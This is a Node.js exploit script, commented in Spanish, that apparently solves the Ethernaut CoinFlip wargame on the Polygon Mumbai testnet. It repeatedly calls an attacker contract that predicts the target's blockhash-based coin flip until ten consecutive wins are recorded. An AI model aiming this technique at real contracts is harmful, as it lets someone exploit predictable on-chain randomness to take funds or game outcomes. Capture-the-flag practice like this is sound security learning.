ENV_NODE=require('dotenv').config();
const Web3 = require('web3');
const Provider = require('@truffle/hdwallet-provider');

const address = '0x601eaA885bF37D28906Ad58d7508cFa1Af10E754'; // la de mi billetera desde donde hice la instancia del contrato
const privateKey = ENV_NODE.parsed.privKey; // la clave privada de la billetera para poder firmar
const nodeUrl = `https://polygon-mumbai.g.alchemy.com/v2/${process.env.PROJECT_ID}`; // el nodo con que firmaré

const SCaddress_hacker = '0x78cc6B107a5ab47B8224Cd80aBce03EB3E6EEc5C'; // address del smart contract
//Abi del smart contract: JSON.stringify(contract.abi) en consola dentro de ethernaut
const abi_hacker = [ { "inputs": [ { "internalType": "address", "name": "_addr", "type": "address" } ], "name": "changeContractToHack", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "flip2", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "flip3", "outputs": [ { "internalType": "bytes", "name": "", "type": "bytes" } ], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [ { "internalType": "address", "name": "_addr", "type": "address" } ], "stateMutability": "nonpayable", "type": "constructor" }, { "inputs": [], "name": "myContract", "outputs": [ { "internalType": "contract coinfliper", "name": "", "type": "address" } ], "stateMutability": "view", "type": "function" } ];
// creo funcion asincronica que haga paso a paso
const SCaddress = '0x9829BE257428FB4f18744653F7875b6D1470B98E';
const abi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"consecutiveWins","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xe6f334d7"},{"inputs":[{"internalType":"bool","name":"_guess","type":"bool"}],"name":"flip","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function","signature":"0x1d263f67"}];


const init3 = async () => {
    // creo provider con el nodo provisto y mi llave privada para poder hacer las firmas sin metamask
    const provider = await new Provider(privateKey, nodeUrl); 
    // genero la instancia web3
    const web3 = await new Web3(provider);
    // creo instancia del contrato para llamar a sus funciones
    const myContract = await new web3.eth.Contract(abi,SCaddress);
    const myHackerContract = await new web3.eth.Contract(abi_hacker,SCaddress_hacker);
  
    var cantidad=0;

    while(cantidad<10) // Se mantiene aca hasta que llega a los 10 triunfos seguidos
    {
      let receipt= await myHackerContract.methods.flip2().send({ from: address }); // calculará el valor y lo manda con el contrato hacker en esta misma carpeta
      cantidad =await myContract.methods.consecutiveWins().call(); // se fija cuantas consecutivas tiene para ver si seguir o parar
      console.log(`Consecutive Wins: ${cantidad}`);      // lo imprimo para ver el progreso
    } // No necesito pausas en el medio porque se hacen solas con el await y lo que tarda en responder la blockchain
}
  
init3();